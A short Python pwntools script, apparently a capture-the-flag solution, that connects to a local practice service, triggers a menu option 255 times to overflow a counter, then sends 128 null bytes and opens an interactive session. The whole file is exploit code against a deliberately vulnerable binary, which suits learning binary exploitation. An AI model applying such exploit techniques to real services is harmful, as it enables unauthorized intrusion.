from pwn import *

conn = remote('0.0.0.0',3040)
#conn = process('./vuln')


for i in range(1,256):
    print(i)
    conn.recvuntil(b"Choose :")
    conn.sendline(b"1") # 1) ++
conn.recvuntil(b"Choose :")
conn.sendline(b"2")
conn.recvuntil(b"Come on you should know the flag now :( :")
padding = b'a'*120
null_bytes = b'\0'
conn.sendline(null_bytes*128)
conn.interactive()
conn.close()
